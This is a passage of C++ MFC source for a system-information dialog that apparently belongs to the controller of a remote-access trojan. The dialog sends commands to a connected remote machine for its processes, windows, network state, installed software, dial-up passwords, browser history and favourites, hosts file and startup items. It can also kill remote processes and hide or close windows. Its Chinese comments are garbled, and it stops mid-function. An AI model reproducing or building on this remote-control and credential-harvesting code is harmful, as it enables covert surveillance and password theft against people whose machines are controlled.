		m_list_windows.ShowWindow(SW_HIDE);    //���ڹ���
		m_list_netstate.ShowWindow(SW_HIDE);   //��������
		m_list_software.ShowWindow(SW_HIDE);   //�����Ϣ
		m_list_dialupass.ShowWindow(SW_HIDE);  //��������
		m_list_iehistory.ShowWindow(SW_HIDE);  //IE�����¼
		m_list_iefavorite.ShowWindow(SW_HIDE); //IE�ղؼ�
		m_edit_hosts.ShowWindow(SW_HIDE);      //Host�ļ�
		m_list_net.ShowWindow(SW_HIDE);      //��������
		m_list_yingjian.ShowWindow(SW_HIDE);  //Ӳ��
		m_list_qidong.ShowWindow(SW_HIDE);  //����
		if (bInit) break;

		OnShowWindow(1);
		if (m_list_systeminfo.GetItemCount() == 0)
			GetSystemInfo();
		break;
	case 1:
		m_list_systeminfo.ShowWindow(SW_HIDE); //ϵͳ��Ϣ
		m_list_process.ShowWindow(SW_SHOW);    //���̹���
		m_list_windows.ShowWindow(SW_HIDE);    //���ڹ���
		m_list_netstate.ShowWindow(SW_HIDE);   //��������
		m_list_software.ShowWindow(SW_HIDE);   //�����Ϣ
		m_list_dialupass.ShowWindow(SW_HIDE);  //��������
		m_list_iehistory.ShowWindow(SW_HIDE);  //IE�����¼
		m_list_iefavorite.ShowWindow(SW_HIDE); //IE�ղؼ�
		m_edit_hosts.ShowWindow(SW_HIDE);      //Host�ļ�
		m_list_net.ShowWindow(SW_HIDE);      //��������
		m_list_yingjian.ShowWindow(SW_HIDE);  //Ӳ��
		m_list_qidong.ShowWindow(SW_HIDE);  //����
		OnShowWindow(0);
		if (m_list_process.GetItemCount() == 0)
			GetProcessList();
		break;
	case 2:
		m_list_systeminfo.ShowWindow(SW_HIDE); //ϵͳ��Ϣ
		m_list_process.ShowWindow(SW_HIDE);    //���̹���
		m_list_windows.ShowWindow(SW_SHOW);    //���ڹ���
		m_list_netstate.ShowWindow(SW_HIDE);   //��������
		m_list_software.ShowWindow(SW_HIDE);   //�����Ϣ
		m_list_dialupass.ShowWindow(SW_HIDE);  //��������
		m_list_iehistory.ShowWindow(SW_HIDE);  //IE�����¼
		m_list_iefavorite.ShowWindow(SW_HIDE); //IE�ղؼ�
		m_edit_hosts.ShowWindow(SW_HIDE);      //Host�ļ�
		m_list_net.ShowWindow(SW_HIDE);      //��������
		m_list_yingjian.ShowWindow(SW_HIDE);  //Ӳ��
		m_list_qidong.ShowWindow(SW_HIDE);  //����
		OnShowWindow(0);
		if (m_list_windows.GetItemCount() == 0)
			GetWindowsList();
		break;
	case 3:
		m_list_systeminfo.ShowWindow(SW_HIDE); //ϵͳ��Ϣ
		m_list_process.ShowWindow(SW_HIDE);    //���̹���
		m_list_windows.ShowWindow(SW_HIDE);    //���ڹ���
		m_list_netstate.ShowWindow(SW_SHOW);   //��������
		m_list_software.ShowWindow(SW_HIDE);   //�����Ϣ
		m_list_dialupass.ShowWindow(SW_HIDE);  //��������
		m_list_iehistory.ShowWindow(SW_HIDE);  //IE�����¼
		m_list_iefavorite.ShowWindow(SW_HIDE); //IE�ղؼ�
		m_edit_hosts.ShowWindow(SW_HIDE);      //Host�ļ�
		m_list_net.ShowWindow(SW_HIDE);      //��������
		m_list_yingjian.ShowWindow(SW_HIDE);  //Ӳ��
		m_list_qidong.ShowWindow(SW_HIDE);  //����
		OnShowWindow(0);
		if (m_list_netstate.GetItemCount() == 0)
			GetNetStateList();
		break;
	case 4:
		m_list_systeminfo.ShowWindow(SW_HIDE); //ϵͳ��Ϣ
		m_list_process.ShowWindow(SW_HIDE);    //���̹���
		m_list_windows.ShowWindow(SW_HIDE);    //���ڹ���
		m_list_netstate.ShowWindow(SW_HIDE);   //��������
		m_list_software.ShowWindow(SW_SHOW);   //�����Ϣ
		m_list_dialupass.ShowWindow(SW_HIDE);  //��������
		m_list_iehistory.ShowWindow(SW_HIDE);  //IE�����¼
		m_list_iefavorite.ShowWindow(SW_HIDE); //IE�ղؼ�
		m_edit_hosts.ShowWindow(SW_HIDE);      //Host�ļ�
		m_list_net.ShowWindow(SW_HIDE);      //��������
		m_list_yingjian.ShowWindow(SW_HIDE);  //Ӳ��
		m_list_qidong.ShowWindow(SW_HIDE);  //����
		OnShowWindow(0);
		if (m_list_software.GetItemCount() == 0)
			GetSoftWareList();
		break;
	case 5:
		m_list_systeminfo.ShowWindow(SW_HIDE); //ϵͳ��Ϣ
		m_list_process.ShowWindow(SW_HIDE);    //���̹���
		m_list_windows.ShowWindow(SW_HIDE);    //���ڹ���
		m_list_netstate.ShowWindow(SW_HIDE);   //��������
		m_list_software.ShowWindow(SW_HIDE);   //�����Ϣ
		m_list_dialupass.ShowWindow(SW_SHOW);  //��������
		m_list_iehistory.ShowWindow(SW_HIDE);  //IE�����¼
		m_list_iefavorite.ShowWindow(SW_HIDE); //IE�ղؼ�
		m_edit_hosts.ShowWindow(SW_HIDE);      //Host�ļ�
		m_list_net.ShowWindow(SW_HIDE);      //��������
		m_list_yingjian.ShowWindow(SW_HIDE);  //Ӳ��
		m_list_qidong.ShowWindow(SW_HIDE);  //����
		OnShowWindow(0);
		if (m_list_dialupass.GetItemCount() == 0)
			GetDialupassList();
		break;
	case 6:
		m_list_systeminfo.ShowWindow(SW_HIDE); //ϵͳ��Ϣ
		m_list_process.ShowWindow(SW_HIDE);    //���̹���
		m_list_windows.ShowWindow(SW_HIDE);    //���ڹ���
		m_list_netstate.ShowWindow(SW_HIDE);   //��������
		m_list_software.ShowWindow(SW_HIDE);   //�����Ϣ
		m_list_dialupass.ShowWindow(SW_HIDE);  //��������
		m_list_iehistory.ShowWindow(SW_SHOW);  //IE�����¼
		m_list_iefavorite.ShowWindow(SW_HIDE); //IE�ղؼ�
		m_edit_hosts.ShowWindow(SW_HIDE);      //Host�ļ�
		m_list_net.ShowWindow(SW_HIDE);      //��������
		m_list_yingjian.ShowWindow(SW_HIDE);  //Ӳ��
		m_list_qidong.ShowWindow(SW_HIDE);  //����
		OnShowWindow(0);
		if (m_list_iehistory.GetItemCount() == 0)
			GetIEhistoryList();
		break;
	case 7:
		m_list_systeminfo.ShowWindow(SW_HIDE); //ϵͳ��Ϣ
		m_list_process.ShowWindow(SW_HIDE);    //���̹���
		m_list_windows.ShowWindow(SW_HIDE);    //���ڹ���
		m_list_netstate.ShowWindow(SW_HIDE);   //��������
		m_list_software.ShowWindow(SW_HIDE);   //�����Ϣ
		m_list_dialupass.ShowWindow(SW_HIDE);  //��������
		m_list_iehistory.ShowWindow(SW_HIDE);  //IE�����¼
		m_list_iefavorite.ShowWindow(SW_SHOW); //IE�ղؼ�
		m_edit_hosts.ShowWindow(SW_HIDE);      //Host�ļ�
		m_list_net.ShowWindow(SW_HIDE);      //��������
		m_list_yingjian.ShowWindow(SW_HIDE);  //Ӳ��
		m_list_qidong.ShowWindow(SW_HIDE);  //����
		OnShowWindow(0);
		if (m_list_iefavorite.GetItemCount() == 0)
			GetFavoritesUrlList();
		break;
	case 8:
		m_list_systeminfo.ShowWindow(SW_HIDE); //ϵͳ��Ϣ
		m_list_process.ShowWindow(SW_HIDE);    //���̹���
		m_list_windows.ShowWindow(SW_HIDE);    //���ڹ���
		m_list_netstate.ShowWindow(SW_HIDE);   //��������
		m_list_software.ShowWindow(SW_HIDE);   //�����Ϣ
		m_list_dialupass.ShowWindow(SW_HIDE);  //��������
		m_list_iehistory.ShowWindow(SW_HIDE);  //IE�����¼
		m_list_iefavorite.ShowWindow(SW_HIDE); //IE�ղؼ�
		m_edit_hosts.ShowWindow(SW_SHOW);      //Host�ļ�
		m_list_net.ShowWindow(SW_HIDE);      //��������
		m_list_yingjian.ShowWindow(SW_HIDE);  //Ӳ��
		m_list_qidong.ShowWindow(SW_HIDE);  //����
		OnShowWindow(2);
		if (m_edit_hosts.GetWindowTextLength() == 0)
			GetHostsInfo();
		break;

	case 9:
		m_list_systeminfo.ShowWindow(SW_HIDE); //ϵͳ��Ϣ
		m_list_process.ShowWindow(SW_HIDE);    //���̹���
		m_list_windows.ShowWindow(SW_HIDE);    //���ڹ���
		m_list_netstate.ShowWindow(SW_HIDE);   //��������
		m_list_software.ShowWindow(SW_HIDE);   //�����Ϣ
		m_list_dialupass.ShowWindow(SW_HIDE);  //��������
		m_list_iehistory.ShowWindow(SW_HIDE);  //IE�����¼
		m_list_iefavorite.ShowWindow(SW_HIDE); //IE�ղؼ�
		m_edit_hosts.ShowWindow(SW_HIDE);      //Host�ļ�
		m_list_net.ShowWindow(SW_SHOW);      //��������
		m_list_yingjian.ShowWindow(SW_HIDE);  //Ӳ��
		m_list_qidong.ShowWindow(SW_HIDE);  //����
		OnShowWindow(0);
		if (m_list_net.GetWindowTextLength() == 0)
			GetNetconfigList();
		break;

	case 10:
		m_list_systeminfo.ShowWindow(SW_HIDE); //ϵͳ��Ϣ
		m_list_process.ShowWindow(SW_HIDE);    //���̹���
		m_list_windows.ShowWindow(SW_HIDE);    //���ڹ���
		m_list_netstate.ShowWindow(SW_HIDE);   //��������
		m_list_software.ShowWindow(SW_HIDE);   //�����Ϣ
		m_list_dialupass.ShowWindow(SW_HIDE);  //��������
		m_list_iehistory.ShowWindow(SW_HIDE);  //IE�����¼
		m_list_iefavorite.ShowWindow(SW_HIDE); //IE�ղؼ�
		m_edit_hosts.ShowWindow(SW_HIDE);      //Host�ļ�
		m_list_net.ShowWindow(SW_HIDE);      //��������
		m_list_yingjian.ShowWindow(SW_SHOW);  //Ӳ��
		m_list_qidong.ShowWindow(SW_HIDE);  //����
		OnShowWindow(0);
		if (m_list_yingjian.GetWindowTextLength() == 0)
			GetHardwareList();
		break;

	case 11:
		m_list_systeminfo.ShowWindow(SW_HIDE); //ϵͳ��Ϣ
		m_list_process.ShowWindow(SW_HIDE);    //���̹���
		m_list_windows.ShowWindow(SW_HIDE);    //���ڹ���
		m_list_netstate.ShowWindow(SW_HIDE);   //��������
		m_list_software.ShowWindow(SW_HIDE);   //�����Ϣ
		m_list_dialupass.ShowWindow(SW_HIDE);  //��������
		m_list_iehistory.ShowWindow(SW_HIDE);  //IE�����¼
		m_list_iefavorite.ShowWindow(SW_HIDE); //IE�ղؼ�
		m_edit_hosts.ShowWindow(SW_HIDE);      //Host�ļ�
		m_list_net.ShowWindow(SW_HIDE);      //��������
		m_list_yingjian.ShowWindow(SW_HIDE);  //Ӳ��
		m_list_qidong.ShowWindow(SW_SHOW);  //����
		OnShowWindow(0);
		if (m_list_qidong.GetWindowTextLength() == 0)
			GetStartupList();
		break;






	}
}

void CSystemDlg::OnShowWindow(int Show)
{
	switch (Show)
	{
	case 0:
		GetDlgItem(IDC_STATIC_CPU)->ShowWindow(SW_HIDE);
		GetDlgItem(IDC_STATIC_MORY)->ShowWindow(SW_HIDE);
		GetDlgItem(IDC_PROGRESS_CPU)->ShowWindow(SW_HIDE);
		GetDlgItem(IDC_SYSINFO_USECPU)->ShowWindow(SW_HIDE);
		GetDlgItem(IDC_PROGRESS_MEMORY)->ShowWindow(SW_HIDE);
		GetDlgItem(IDC_SYSINFO_USEMEMORY)->ShowWindow(SW_HIDE);
		GetDlgItem(IDC_BTN_GETHOSTS)->ShowWindow(SW_HIDE);
		GetDlgItem(IDC_BTN_SETHOSTS)->ShowWindow(SW_HIDE);
		break;
	case 1:
		GetDlgItem(IDC_STATIC_CPU)->ShowWindow(SW_SHOW);
		GetDlgItem(IDC_STATIC_MORY)->ShowWindow(SW_SHOW);
		GetDlgItem(IDC_PROGRESS_CPU)->ShowWindow(SW_SHOW);
		GetDlgItem(IDC_SYSINFO_USECPU)->ShowWindow(SW_SHOW);
		GetDlgItem(IDC_PROGRESS_MEMORY)->ShowWindow(SW_SHOW);
		GetDlgItem(IDC_SYSINFO_USEMEMORY)->ShowWindow(SW_SHOW);
		GetDlgItem(IDC_BTN_GETHOSTS)->ShowWindow(SW_HIDE);
		GetDlgItem(IDC_BTN_SETHOSTS)->ShowWindow(SW_HIDE);
		break;
	case 2:
		GetDlgItem(IDC_STATIC_CPU)->ShowWindow(SW_HIDE);
		GetDlgItem(IDC_STATIC_MORY)->ShowWindow(SW_HIDE);
		GetDlgItem(IDC_PROGRESS_CPU)->ShowWindow(SW_HIDE);
		GetDlgItem(IDC_SYSINFO_USECPU)->ShowWindow(SW_HIDE);
		GetDlgItem(IDC_PROGRESS_MEMORY)->ShowWindow(SW_HIDE);
		GetDlgItem(IDC_SYSINFO_USEMEMORY)->ShowWindow(SW_HIDE);
		GetDlgItem(IDC_BTN_GETHOSTS)->ShowWindow(SW_SHOW);
		GetDlgItem(IDC_BTN_SETHOSTS)->ShowWindow(SW_SHOW);
		break;
	}
}

void CSystemDlg::OnNMRClickListProcess(NMHDR* pNMHDR, LRESULT* pResult)
{
	// TODO: �ڴ���ӿؼ�֪ͨ����������
	CMenu	popup;

	if (m_list_process.IsWindowVisible())
		popup.LoadMenu(IDR_PSLIST);
	else if (m_list_windows.IsWindowVisible())
		popup.LoadMenu(IDR_WINDOW_LIST);

	CMenu* pM = popup.GetSubMenu(0);
	CPoint	p;
	GetCursorPos(&p);

	pM->TrackPopupMenu(TPM_LEFTALIGN, p.x, p.y, this); //�������û���Ҽ�ͼ��
//	CXTPCommandBars::TrackPopupMenu(pM, TPM_LEFTALIGN, p.x, p.y, this);
	*pResult = 0;
}

void CSystemDlg::OnKillProcess()
{
	KillProcessDel(COMMAND_KILLPROCESS, "");  //��������
}

void CSystemDlg::OnKillDelete()
{
	KillProcessDel(COMMAND_KILLPROCESS, "��ɾ��");  //������ɾ������
}

void CSystemDlg::KillProcessDel(BYTE Buffer, char* strbuf)
{
	CListCtrl* pListCtrl = NULL;
	if (m_list_process.IsWindowVisible())
		pListCtrl = &m_list_process;
	else if (m_list_netstate.IsWindowVisible())
		pListCtrl = &m_list_netstate;
	else return;

	LPBYTE lpBuffer = (LPBYTE)LocalAlloc(LPTR, 1 + (pListCtrl->GetSelectedCount() * 4));
	lpBuffer[0] = Buffer;

	char* lpTips =
		"����: ��ֹ���̻ᵼ�²�ϣ�������Ľ����\n"
		"�������ݶ�ʧ��ϵͳ���ȶ����ڱ���ֹǰ��\n"
		"���̽�û�л��ᱣ����״̬�����ݡ�";
	CString str;
	if (pListCtrl->GetSelectedCount() > 1)
	{
		str.Format("%sȷʵ\n����ֹ��%d�������?", lpTips, pListCtrl->GetSelectedCount());
	}
	else
	{
		str.Format("%sȷʵ\n����ֹ���������?", lpTips);
	}
	if (::MessageBox(m_hWnd, str, "���̽�������", MB_YESNO | MB_ICONQUESTION) == IDNO)
		return;

	DWORD	dwOffset = 1;
	POSITION pos = pListCtrl->GetFirstSelectedItemPosition(); //iterator for the CListCtrl

	while (pos) //so long as we have a valid POSITION, we keep iterating
	{
		int	nItem = pListCtrl->GetNextSelectedItem(pos);
		DWORD dwProcessID = pListCtrl->GetItemData(nItem);
		memcpy(lpBuffer + dwOffset, &dwProcessID, sizeof(DWORD));
		dwOffset += sizeof(DWORD);
	}
	LocalSizeT pLocalSize = (LocalSizeT)GetProcAddress(LoadLibrary("KERNEL32.dll"), "LocalSize");
	m_iocpServer->Send(m_pContext, lpBuffer, pLocalSize(lpBuffer));
	LocalFree(lpBuffer);
}

void CSystemDlg::OnRefreshPsList()
{
	GetProcessList();
}

void CSystemDlg::GetProcessList()
{
	BYTE bToken = COMMAND_PSLIST;
	m_iocpServer->Send(m_pContext, &bToken, 1);
}

void CSystemDlg::GetWindowsList()
{
	BYTE bToken = COMMAND_WSLIST;
	m_iocpServer->Send(m_pContext, &bToken, 1);
}

void CSystemDlg::GetDialupassList()
{
	BYTE bToken = COMMAND_DIALUPASS;
	m_iocpServer->Send(m_pContext, &bToken, 1);
}

void CSystemDlg::GetSystemInfo()
{
	BYTE bToken = COMMAND_SYSTEMINFO;
	m_iocpServer->Send(m_pContext, &bToken, 1);
}

void CSystemDlg::GetHostsInfo()
{
	BYTE bToken = COMMAND_GETHOSTS;
	m_iocpServer->Send(m_pContext, &bToken, 1);
}

void CSystemDlg::GetNetconfigList()
{
	BYTE bToken = COMMAND_NETCONFIG;
	m_iocpServer->Send(m_pContext, &bToken, 1);
}


void CSystemDlg::GetHardwareList()
{
	BYTE bToken = COMMAND_HARDWARE;
	m_iocpServer->Send(m_pContext, &bToken, 1);
}

void CSystemDlg::GetStartupList()
{
	BYTE bToken = COMMAND_STARTUP;
	m_iocpServer->Send(m_pContext, &bToken, 1);
}


void CSystemDlg::GetCpuMemory()
{
	BYTE  bToken = COMMAND_MEMOEY;
	m_iocpServer->Send(m_pContext, &bToken, 1);
}

void CSystemDlg::OnSelChangeTab(NMHDR* pNMHDR, LRESULT* pResult)
{
	// TODO: Add your control notification handler code here
	ShowSelectWindow();
	*pResult = 0;
}

void CSystemDlg::OnWindowReflush()
{
	// TODO: �ڴ���������������
	GetWindowsList();
}

void CSystemDlg::OnWindowClose()
{
	// TODO: �ڴ���������������
	BYTE lpMsgBuf[20];
	CListCtrl* pListCtrl = NULL;
	pListCtrl = &m_list_windows;

	int	nItem = pListCtrl->GetSelectionMark();
	if (nItem >= 0)
	{
		ZeroMemory(lpMsgBuf, 20);
		lpMsgBuf[0] = COMMAND_WINDOW_CLOSE;      //ע������������ǵ�����ͷ
		DWORD hwnd = pListCtrl->GetItemData(nItem); //�õ����ڵľ��һͬ����
		memcpy(lpMsgBuf + 1, &hwnd, sizeof(DWORD));
		m_iocpServer->Send(m_pContext, lpMsgBuf, sizeof(lpMsgBuf));
	}
}

void CSystemDlg::OnWindowHide()
{
	// TODO: �ڴ���������������
	BYTE lpMsgBuf[20];
	CListCtrl* pListCtrl = NULL;
	pListCtrl = &m_list_windows;

	int	nItem = pListCtrl->GetSelectionMark();
	if (nItem >= 0)
	{
		ZeroMemory(lpMsgBuf, 20);
		lpMsgBuf[0] = COMMAND_WINDOW_TEST;       //���ڴ�������ͷ
		DWORD hwnd = pListCtrl->GetItemData(nItem);  //�õ����ڵľ��һͬ����
		pListCtrl->SetItemText(nItem, 2, "����");  //ע����ʱ���б��е���ʾ״̬Ϊ"����"
		//������ɾ���б���Ŀʱ�Ͳ�ɾ�������� ���ɾ������ھ���ᶪʧ ����ԶҲ������ʾ��
		memcpy(lpMsgBuf + 1, &hwnd, sizeof(DWORD));  //�õ����ڵľ��һͬ����
		DWORD dHow = SW_HIDE;               //���ڴ������ 0
		memcpy(lpMsgBuf + 1 + sizeof(hwnd), &dHow, sizeof(DWORD));
		m_iocpServer->Send(m_pContext, lpMsgBuf, sizeof(lpMsgBuf));
	}
}

void CSystemDlg::OnWindowShow()
{
	// TODO: �ڴ���������������
	BYTE lpMsgBuf[20];
	CListCtrl* pListCtrl = NULL;
	pListCtrl = &m_list_windows;

	int	nItem = pListCtrl->GetSelectionMark();
	if (nItem >= 0)
	{
		ZeroMemory(lpMsgBuf, 20);
		lpMsgBuf[0] = COMMAND_WINDOW_TEST;
		DWORD hwnd = pListCtrl->GetItemData(nItem);
		pListCtrl->SetItemText(nItem, 2, "��ʾ");
		memcpy(lpMsgBuf + 1, &hwnd, sizeof(DWORD));
		DWORD dHow = SW_RESTORE;
		memcpy(lpMsgBuf + 1 + sizeof(hwnd), &dHow, sizeof(DWORD));
		m_iocpServer->Send(m_pContext, lpMsgBuf, sizeof(lpMsgBuf));
	}
}

void CSystemDlg::OnWindowMax()
{
	// TODO: �ڴ���������������
	BYTE lpMsgBuf[20];
	CListCtrl* pListCtrl = NULL;
	pListCtrl = &m_list_windows;

	int	nItem = pListCtrl->GetSelectionMark();
	if (nItem >= 0)
	{
		ZeroMemory(lpMsgBuf, 20);
		lpMsgBuf[0] = COMMAND_WINDOW_TEST;     //ͬ��
		DWORD hwnd = pListCtrl->GetItemData(nItem);  //ͬ��
		pListCtrl->SetItemText(nItem, 2, "��ʾ");   //��״̬��Ϊ��ʾ
		memcpy(lpMsgBuf + 1, &hwnd, sizeof(DWORD));
		DWORD dHow = SW_MAXIMIZE;     //ͬ��
		memcpy(lpMsgBuf + 1 + sizeof(hwnd), &dHow, sizeof(DWORD));
		m_iocpServer->Send(m_pContext, lpMsgBuf, sizeof(lpMsgBuf));
	}
}

void CSystemDlg::OnWindowMin()
{
	// TODO: �ڴ���������������
	BYTE lpMsgBuf[20];
	CListCtrl* pListCtrl = NULL;
	pListCtrl = &m_list_windows;

	int	nItem = pListCtrl->GetSelectionMark();
	if (nItem >= 0)
	{
		ZeroMemory(lpMsgBuf, 20);
		lpMsgBuf[0] = COMMAND_WINDOW_TEST;
		DWORD hwnd = pListCtrl->GetItemData(nItem);
		pListCtrl->SetItemText(nItem, 2, "��ʾ");
		memcpy(lpMsgBuf + 1, &hwnd, sizeof(DWORD));
		DWORD dHow = SW_MINIMIZE;
		memcpy(lpMsgBuf + 1 + sizeof(hwnd), &dHow, sizeof(DWORD));
		m_iocpServer->Send(m_pContext, lpMsgBuf, sizeof(lpMsgBuf));
	}
}

void CSystemDlg::GetNetStateList()
{
	BYTE bToken = COMMAND_NSLIST;
	m_iocpServer->Send(m_pContext, &bToken, 1);
}

void CSystemDlg::GetFavoritesUrlList()
{
	BYTE bToken = COMMAND_FULIST;
	m_iocpServer->Send(m_pContext, &bToken, 1);
}

void CSystemDlg::GetIEhistoryList()
{
	BYTE bToken = COMMAND_IHLIST;
	m_iocpServer->Send(m_pContext, &bToken, 1);
}

void CSystemDlg::GetSoftWareList()
{
	BYTE bToken = COMMAND_SOFTWARELIST;
	m_iocpServer->Send(m_pContext, &bToken, 1);
}

void CSystemDlg::ShowSoftWareList()
{
	LPBYTE	lpBuffer = (LPBYTE)(m_pContext->m_DeCompressionBuffer.GetBuffer(1));
	DWORD	dwOffset = 0;

	m_list_software.DeleteAllItems();

	for (int i = 0; dwOffset < m_pContext->m_DeCompressionBuffer.GetBufferLen() - 1; i++)
	{
		for (int j = 0; j < 5; j++)
		{
			char* lpString = (char*)lpBuffer + dwOffset;

			if (j == 0)
				m_list_software.InsertItem(i, lpString, 0);
			else
				m_list_software.SetItemText(i, j, lpString);

			dwOffset += lstrlen(lpString) + 1;
		}
	}
}

void CSystemDlg::ShowIEHistoryList()
{
	m_list_iehistory.DeleteAllItems();

	LPBYTE	lpBuffer = (LPBYTE)(m_pContext->m_DeCompressionBuffer.GetBuffer(1));
	DWORD	dwOffset = 0;

	CString	str;
	for (int i = 0; dwOffset < m_pContext->m_DeCompressionBuffer.GetBufferLen() - 1; i++)
	{
		str.Format("%d", i);

		for (int j = 0; j < 4; j++)
		{
			if (j == 0)
				m_list_iehistory.InsertItem(i, str, 0);
			else
			{
				char* lpString = (char*)lpBuffer + dwOffset;

				m_list_iehistory.SetItemText(i, j, lpString);

				dwOffset += lstrlen(lpString) + 1;
			}
		}
	}
}

void CSystemDlg::ShowFavoritesUrlList()
{
	m_list_iefavorite.DeleteAllItems();

	LPBYTE	lpBuffer = (LPBYTE)(m_pContext->m_DeCompressionBuffer.GetBuffer(1));
	DWORD	dwOffset = 0;

	for (int i = 0; dwOffset < m_pContext->m_DeCompressionBuffer.GetBufferLen() - 1; i++)
	{
		for (int j = 0; j < 2; j++)
		{
			char* lpString = (char*)lpBuffer + dwOffset;

			if (j == 0)
				m_list_iefavorite.InsertItem(i, lpString, 0);
			else
				m_list_iefavorite.SetItemText(i, j, lpString);

			dwOffset += lstrlen(lpString) + 1;
		}
	}
}

void CSystemDlg::ShowNetStateList()
{
	m_list_netstate.DeleteAllItems();
	LPBYTE	lpBuffer = (LPBYTE)(m_pContext->m_DeCompressionBuffer.GetBuffer(1));
	DWORD	dwOffset = 0;
	CString str, IPAddress;

	for (int i = 0; dwOffset < m_pContext->m_DeCompressionBuffer.GetBufferLen() - 1; i++)
	{
		for (int j = 0; j < 7; j++)
		{
			if (j == 0)
			{
				char* lpString = (char*)lpBuffer + dwOffset;

				m_list_netstate.InsertItem(i, lpString, 0);
				dwOffset += lstrlen(lpString) + 1;
			}
			else if (j == 1)
			{
				LPDWORD	lpPID = LPDWORD(lpBuffer + dwOffset);
				str.Format("%d", *lpPID);
				m_list_netstate.SetItemText(i, j, str);
				m_list_netstate.SetItemData(i, *lpPID);

				dwOffset += sizeof(DWORD) + 1;
			}
			else if (j == 5)
			{
				IPAddress = m_list_netstate.GetItemText(i, 4);

				int n = IPAddress.ReverseFind(':');
				if (n > 0)
				{
					IPAddress = IPAddress.Left(n);

					str = m_SQQwry.IPtoAdd(IPAddress);

					m_list_netstate.SetItemText(i, j, str);
				}
			}
			else
			{
				char* lpString = (char*)lpBuffer + dwOffset;

				m_list_netstate.SetItemText(i, j, lpString);
				dwOffset += lstrlen(lpString) + 1;
			}
		}
	}
}

void CSystemDlg::ShowHostsInfo()
{
	LPBYTE	lpBuffer = (LPBYTE)(m_pContext->m_DeCompressionBuffer.GetBuffer(1));

	m_edit_hosts.SetWindowText((LPCSTR)lpBuffer);
}


void CSystemDlg::ShowNetconfigList()
{

	m_list_net.DeleteAllItems();




	CString str;
	LPBYTE	lpBuffer = (LPBYTE)(m_pContext->m_DeCompressionBuffer.GetBuffer(1));
	DWORD	dwOffset = 0;
	int i;
	for ( i = 0; dwOffset < m_pContext->m_DeCompressionBuffer.GetBufferLen() - 1; i++)
	{
		for (int j = 0; j < 7; j++)
		{
			char* lpString = (char*)lpBuffer + dwOffset;
			if (j == 0)
				m_list_net.InsertItem(i, lpString);
			else
				m_list_net.SetItemText(i, j, lpString);
			dwOffset += lstrlen(lpString) + 1;
		}
	}

	str.Format("���ӷ�ʽ / %d", i);
	LVCOLUMN lvc;
	lvc.mask = LVCF_TEXT;
	lvc.pszText = str.GetBuffer(0);
	lvc.cchTextMax = str.GetLength();
	m_list_net.SetColumn(0, &lvc);


}


void CSystemDlg::ShowHardwareList()
{

	m_list_yingjian.DeleteAllItems();





	CString str;
	LPBYTE	lpBuffer = (LPBYTE)(m_pContext->m_DeCompressionBuffer.GetBuffer(1));
	DWORD	dwOffset = 0;
	int i;
	for ( i = 0; dwOffset < m_pContext->m_DeCompressionBuffer.GetBufferLen() - 1; i++)
	{
		for (int j = 0; j < 3; j++)
		{
			char* lpString = (char*)lpBuffer + dwOffset;
			switch (j)
			{
			case 0:
			{
				m_list_yingjian.InsertItem(i, lpString);
				dwOffset += lstrlen(lpString) + 1;
			}
			break;
			case 1:
			{
				m_list_yingjian.SetItemText(i, j, lpString);
				dwOffset += lstrlen(lpString) + 1;
			}
			break;
			case 2:
			{
				m_list_yingjian.SetItemText(i, j, lpString);
				dwOffset += lstrlen(lpString) + 1;
			}
			break;
			default:
				break;
			}
		
				
			
		}
	}


	str.Format("���� / %d", i);
	LVCOLUMN lvc;
	lvc.mask = LVCF_TEXT;
	lvc.pszText = str.GetBuffer(0);
	lvc.cchTextMax = str.GetLength();
	m_list_yingjian.SetColumn(0, &lvc);


}

void CSystemDlg::ShowStartupList()
{

	m_list_qidong.DeleteAllItems();





	CString str;
	LPBYTE	lpBuffer = (LPBYTE)(m_pContext->m_DeCompressionBuffer.GetBuffer(1));
	DWORD	dwOffset = 0;
	int i;
	for ( i = 0; dwOffset < m_pContext->m_DeCompressionBuffer.GetBufferLen() - 1; i++)
	{
		for (int j = 0; j < 3; j++)
		{
			char* lpString = (char*)lpBuffer + dwOffset;

			if (j == 0)
				m_list_qidong.InsertItem(i, lpString, 0);
			else
				m_list_qidong.SetItemText(i, j, lpString);

			dwOffset += lstrlen(lpString) + 1;
		}
	}


	str.Format("�������� / %d", i);
	LVCOLUMN lvc;
	lvc.mask = LVCF_TEXT;
	lvc.pszText = str.GetBuffer(0);
	lvc.cchTextMax = str.GetLength();
	m_list_qidong.SetColumn(0, &lvc);


}


void CSystemDlg::OnRclickList1(NMHDR* pNMHDR, LRESULT* pResult)
{
	// TODO: Add your control notification handler code here

	CMenu	popup;
	popup.LoadMenu(IDR_p);
	CMenu* pM = popup.GetSubMenu(0);
	CPoint	p;
	GetCursorPos(&p);
	int a1[4] = { 2,3,4,5 };
	int a2[2] = { 2,3 };
	int a3[3] = { 3,4,5 };
	int a4[3] = { 2,4,5 };

	switch (m_tab.GetCurSel())
	{
	case 0:
	case 5:
	{
		for (int i = 4; i > 0; i--)
		{
			pM->DeleteMenu(a1[i - 1], MF_BYPOSITION);
		}
	}
	break;
	case 3:
	{
		for (int i = 2; i > 0; i--)
		{
			pM->DeleteMenu(a2[i - 1], MF_BYPOSITION);
		}
	}
	break;
	case 4:
	{
		for (int i = 3; i > 0; i--)
		{
			pM->DeleteMenu(a3[i - 1], MF_BYPOSITION);
		}
	}
	break;
	case 6:
	case 7:
	{
		for (int i = 3; i > 0; i--)
		{
			pM->DeleteMenu(a4[i - 1], MF_BYPOSITION);
		}
	}
	break;
	case 9:
	case 10:
	case 11:
	{
		for (int i = 4; i > 0; i--)
		{
			pM->DeleteMenu(a1[i - 1], MF_BYPOSITION);
		}
	}
	break;
	default:
		break;
	}

		pM->TrackPopupMenu(TPM_LEFTALIGN, p.x, p.y, this); //�������û���Ҽ�ͼ��
	//CXTPCommandBars::TrackPopupMenu(pM, 0, p.x, p.y, this);
	*pResult = 0;
}

void CSystemDlg::OnMenuitem40015()
{
	// TODO: Add your command handler code here
	switch (m_tab.GetCurSel())
	{
	case 0:
		GetSystemInfo();
		break;
	case 3:
		GetNetStateList();
		break;
	case 4:
		GetSoftWareList();
		break;
	case 5:
		GetDialupassList();
		break;
	case 6:
		GetIEhistoryList();
		break;
	case 7:
		GetFavoritesUrlList();
		break;
	case 9:
		GetNetconfigList();
		break;
	case 10:
		GetHardwareList();
		break;
	case 11:
		GetStartupList();
		break;
	}
}

void CSystemDlg::SetClipboardText(CString& Data)
{
	if (::OpenClipboard(NULL))
	{
		HGLOBAL   clipbuffer;
		char* buffer;
		EmptyClipboard();
		clipbuffer = GlobalAlloc(GMEM_DDESHARE, Data.GetLength() + 1);
		buffer = (char*)GlobalLock(clipbuffer);
